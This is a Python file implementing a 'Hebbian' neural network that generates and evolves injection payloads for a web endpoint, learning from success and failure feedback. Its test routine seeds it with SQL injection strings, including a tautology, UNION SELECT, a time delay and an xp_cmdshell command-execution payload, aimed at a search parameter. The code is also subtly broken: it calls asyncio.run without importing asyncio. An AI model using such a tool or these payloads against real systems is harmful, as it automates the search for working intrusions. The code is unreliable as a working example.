import numpy as np
import random
import logging

logger = logging.getLogger(__name__)

class HebbianNeuron:
    def __init__(self, num_inputs, learning_rate=0.01, decay_rate=0.001):
        self.weights = np.random.rand(num_inputs) * 0.1 # Initialize small random weights
        self.learning_rate = learning_rate
        self.decay_rate = decay_rate
        self.activation = 0.0

    def activate(self, inputs):
        """Simple dot product activation."""
        self.activation = np.dot(inputs, self.weights)
        return self.activation

    def update_weights(self, inputs, output, feedback_signal):
        """Hebb's rule: weights increase if inputs and output are correlated."""
        # feedback_signal: positive for success, negative for failure, 0 for neutral
        
        # Apply Hebbian learning
        delta_weights = self.learning_rate * feedback_signal * inputs * output
        self.weights += delta_weights
        
        # Apply decay to prevent weights from growing indefinitely and encourage forgetting less useful patterns
        self.weights *= (1 - self.decay_rate)
        
        # Keep weights normalized or bounded if necessary for stability
        self.weights = np.clip(self.weights, -1.0, 1.0) # Example clipping

class HebbianNetwork:
    def __init__(self, target_endpoint_context, initial_payload_patterns, num_neurons=10, learning_rate=0.01, decay_rate=0.001):
        self.target_endpoint_context = target_endpoint_context # e.g., {'url': '...', 'method': '...', 'params': ['param1', 'param2']}
        self.initial_payload_patterns = initial_payload_patterns # List of base strings/components for payloads
        self.num_neurons = num_neurons
        
        # Each "neuron" in this context will focus on generating a part of or a specific type of payload.
        # For simplicity, we'll imagine inputs to neurons represent features of the target context
        # and current payload components.
        
        # Example: Input features could be:
        # 0: presence of 'id' param
        # 1: presence of 'search' param
        # 2: technology detected (one-hot encoded)
        # 3: previous payload success (binary)
        # 4: previous payload failure (binary)
        
        # Let's simplify input for now: we'll use the *index* of base patterns and feedback.
        # The true input features will be the binary presence of initial_payload_patterns
        # in the 'seed' payload from which mutations are generated.
        self.feature_vector_size = len(self.initial_payload_patterns) + 2 # +2 for success/failure feedback
        self.neurons = [HebbianNeuron(self.feature_vector_size, learning_rate, decay_rate) for _ in range(num_neurons)]
        
        self.memory = [] # Store successful payloads and their context for self-reinforcement
        self.successful_patterns = set() # Store unique successful payloads

        logger.info(f"Hebbian Network initialized for endpoint: {target_endpoint_context.get('url')}")

    def _generate_input_vector(self, current_payload_components=None, last_feedback=None):
        """Generates a feature vector for the neurons based on current context and feedback."""
        vector = np.zeros(self.feature_vector_size)
        
        if current_payload_components:
            for i, pattern in enumerate(self.initial_payload_patterns):
                if pattern in current_payload_components: # Check if base pattern is part of the current components
                    vector[i] = 1.0
        
        # Add feedback signals as input features
        if last_feedback == "SUCCESS":
            vector[self.feature_vector_size - 2] = 1.0
        elif last_feedback == "FAILURE":
            vector[self.feature_vector_size - 1] = 1.0
            
        return vector

    def generate_payload(self, previous_payload=None, last_feedback=None):
        """
        Generates a new payload by activating neurons and combining patterns.
        If previous_payload is provided, it tries to mutate it based on feedback.
        """
        seed_components = []
        if previous_payload:
            # Break down previous_payload into its components for feature extraction
            # This is a simplification; in reality, a more robust parsing is needed.
            for pattern in self.initial_payload_patterns:
                if pattern in previous_payload:
                    seed_components.append(pattern)
            
        input_vector = self._generate_input_vector(seed_components, last_feedback)
        
        # Activate neurons and get their "preference" for certain patterns
        neuron_outputs = []
        for neuron in self.neurons:
            neuron_outputs.append(neuron.activate(input_vector))
        
        # Decide which patterns to combine based on neuron outputs (weights)
        # A simple strategy: pick patterns corresponding to highly activated neurons
        # and also introduce some randomness (mutation/exploration).
        
        selected_patterns = []
        # Sort patterns by their average weight contribution across neurons,
        # or by how much they correlate with positive feedback.
        
        # For simplicity, let's just pick based on random choice weighted by (activation + randomness)
        weights_for_selection = np.array([n.activation for n in self.neurons])
        weights_for_selection = np.maximum(0, weights_for_selection) # Ensure non-negative
        if np.sum(weights_for_selection) == 0:
            probabilities = np.ones(len(self.initial_payload_patterns)) / len(self.initial_payload_patterns)
        else:
            # Map neuron activations to pattern selection. This is a complex mapping.
            # For this simple Hebbian model, let's just use a weighted random choice
            # from the initial patterns based on a combination of current neuron states
            # and a general tendency to explore.
            probabilities = np.array([np.mean([n.weights[i] for n in self.neurons]) for i in range(len(self.initial_payload_patterns))])
            probabilities = np.maximum(0, probabilities) # Ensure non-negative
            probabilities = probabilities / np.sum(probabilities) if np.sum(probabilities) > 0 else np.ones(len(self.initial_payload_patterns)) / len(self.initial_payload_patterns)
            
        
        num_components_to_pick = random.randint(1, min(len(self.initial_payload_patterns), 3)) # Pick 1-3 components
        selected_indices = np.random.choice(len(self.initial_payload_patterns), size=num_components_to_pick, p=probabilities, replace=False)
        
        for idx in selected_indices:
            selected_patterns.append(self.initial_payload_patterns[idx])

        # Add a random mutation or combination element
        if random.random() < 0.3: # 30% chance of adding a random known successful pattern
            if self.successful_patterns:
                selected_patterns.append(random.choice(list(self.successful_patterns)))
        
        # Combine patterns to form the payload. This is highly application-specific.
        # For XSS, it could be concatenating tags. For SQLi, adding boolean conditions.
        # We need a 'payload templater' or 'mutator' logic here.
        
        # Simple concatenation for demonstration
        new_payload = "".join(selected_patterns) if selected_patterns else random.choice(self.initial_payload_patterns)
        
        # Ensure some basic payload always exists if generation fails
        if not new_payload:
            new_payload = random.choice(self.initial_payload_patterns)

        logger.debug(f"Generated payload for {self.target_endpoint_context.get('url')}: {new_payload}")
        return new_payload

    def provide_feedback(self, payload, feedback_signal):
        """
        Updates the neuron weights based on the outcome of a payload.
        feedback_signal: +1 for success, -1 for failure, 0 for neutral/unknown.
        """
        seed_components = []
        for pattern in self.initial_payload_patterns:
            if pattern in payload:
                seed_components.append(pattern)
        
        input_vector = self._generate_input_vector(seed_components) # No feedback in this input vector when *updating*
        
        for neuron in self.neurons:
            output = neuron.activate(input_vector) # Calculate output based on previous state
            neuron.update_weights(input_vector, output, feedback_signal)
        
        if feedback_signal > 0: # Successful payload
            self.memory.append({'payload': payload, 'context': self.target_endpoint_context, 'feedback': feedback_signal})
            self.successful_patterns.add(payload) # Add full payload to successful patterns

        logger.debug(f"Feedback for payload '{payload}' on {self.target_endpoint_context.get('url')}: {feedback_signal}")

    def get_successful_patterns(self):
        return list(self.successful_patterns)

# Example Usage (for testing)
async def test_hebbian_network():
    logger.setLevel(logging.DEBUG)
    logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s')

    endpoint_context = {'url': 'http://example.com/search', 'method': 'GET', 'params': [{'name': 'q', 'type': 'text'}]}
    
    # Initial SQLi patterns (simplified)
    initial_sqli_patterns = [
        "' OR 1=1 --",
        "UNION SELECT 1,2,3--",
        "admin'--",
        "'; EXEC xp_cmdshell('dir'); --",
        "sleep(5)--",
        "\" OR \"a\"=\"a",
        "ORDER BY 1--",
        "/*",
        "*/"
    ]

    hn = HebbianNetwork(endpoint_context, initial_sqli_patterns, num_neurons=5)

    print("\n--- Hebbian Learning Simulation ---")

    # Simulate some interactions
    for i in range(10):
        print(f"\nIteration {i+1}:")
        payload = hn.generate_payload()
        print(f"Generated Payload: {payload}")

        # Simulate feedback: success every 3rd iteration
        if (i + 1) % 3 == 0:
            feedback = 1 # Success
            print("SIMULATED FEEDBACK: SUCCESS")
        else:
            feedback = -1 # Failure
            print("SIMULATED FEEDBACK: FAILURE")
        
        hn.provide_feedback(payload, feedback)
    
    print("\n--- Successful Patterns Learned ---")
    for pattern in hn.get_successful_patterns():
        print(pattern)
    
    print("\n--- Neuron Weights (Example) ---")
    for i, neuron in enumerate(hn.neurons):
        print(f"Neuron {i} weights: {neuron.weights}")

if __name__ == "__main__":
    asyncio.run(test_hebbian_network())
